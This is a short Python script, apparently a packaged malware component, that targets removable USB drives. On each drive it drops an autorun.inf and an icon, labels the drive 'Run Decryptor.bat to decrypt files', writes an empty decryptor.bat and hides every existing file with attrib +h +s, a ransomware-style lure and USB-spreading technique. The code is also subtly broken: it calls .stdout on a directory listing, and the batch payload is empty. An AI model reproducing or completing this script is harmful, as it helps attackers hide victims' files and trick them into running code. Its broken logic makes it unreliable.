import psutil
from subprocess import run
import sys
from os.path import join
from os import listdir
from shutil import copy
# file contents to be written
#autorun
autorun = ["autorun.inf","""[autorun]
label=Run Decryptor.bat to decrypt files
ICON=icon.ico
open=.\decryptor.bat"""]
#decryptor
decryptor = ["decryptor.bat",'''
''']
#icon
icon = join(sys._MEIPASS,"icon.ico")
pendrives = []

# scanning for pendrive
for drive in psutil.disk_partitions():
    if "rw,removable" in drive.opts:
        pendrives.append(drive.mountpoint)

def scanfiles(path):
    output = listdir(path)
    return output.stdout.split("\n") if not output.stderr else None
    
for path in pendrives:
    fplist = scanfiles(path)
    if not fplist:
        break
    fplist.append(icon)
    # copy autorun and icon
    copy(icon, path)
    
    # create autorun.inf and decryptor.bat
    with open(join(path,autorun[0]),"wt") as file:
        file.write(autorun[1])
    with open(join(path,decryptor[0]),"wt") as file:
        file.write(decryptor[1])
    
    # hiding all items and autorun
    for fname in fplist:
        run(["attrib","+h","+s",join(path,fname)])
        
